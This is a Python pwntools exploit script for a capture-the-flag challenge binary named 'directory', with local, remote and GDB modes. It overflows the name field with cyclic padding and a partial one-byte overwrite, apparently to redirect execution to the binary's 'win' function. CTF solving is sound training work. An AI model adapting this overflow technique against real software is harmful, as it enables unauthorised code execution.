#! /usr/bin/python3
from pwn import *

REMOTE = "nc directory.chal.cyberjousting.com 1349"
context.binary = elf = ELF("./directory")
context.timeout = Timeout.forever
context.log_console = sys.stderr
context.terminal = ["tmux", "splitw", "-h"]
# libc = ELF("/lib64/libc.so.6")
# libc = ELF("./libc.so.6")


def main(bf=0):
    bf = bf # To shut up whatever Python syntax highlighter I use
    t = conn()

    for i in range(10):
        info(f"{i=}")
        # if i == 5:
        #     t.recvuntil(b"...\n")
        #     leak = u64(b'\x00' + t.recvline()[:-1][-5:] + b"\x00" * 2)
        #     info(f"{leak=:x}")
        #     continue
        t.sendlineafter(b'>', b"1")
        
        if i == 9:
            t.sendafter(b'name: ', cyclic(0x28) + b'\x38')
            t.sendlineafter(b'>', b"4")
            continue
        else:
            t.sendafter(b'name: ', cyclic(0x30))
        t.sendlineafter(b'>', b"3")


    # t.sendlineafter(b'>', b'1')
    # t.sendlineafter(b'name: ', p64(elf.sym["win"])+cyclic(0x20))

    t.interactive()
    t.close()


# Handles a 'nc addr port' string like those provided in CTFs
def get_addr(s: str):
    s = s.strip().removeprefix('nc ')
    splitter = ':' if ':' in s else ' '
    addr = s.split(splitter)[0]
    port = int(s.split(splitter)[1])
    return (addr, port)


def conn() -> remote | process:
    if args.I or args.INFO or args.i or args.info:
        context.log_level = "info"
    else:
        context.log_level = "debug"

    if args.R or args.REMOTE or args.r or args.remote: # Remote host
        t = remote(*get_addr(REMOTE))
    else:
        t = process([elf.path])
        if args.G or args.GDB or args.g or args.gdb:
            gdb.attach(t, gdbscript="""
            b *process_menu+87
            b *process_menu+562
            c
            """)
    return t

# Bruteforcing setup 
for i in range(1):
    print(f"{i=}")
    main(i)
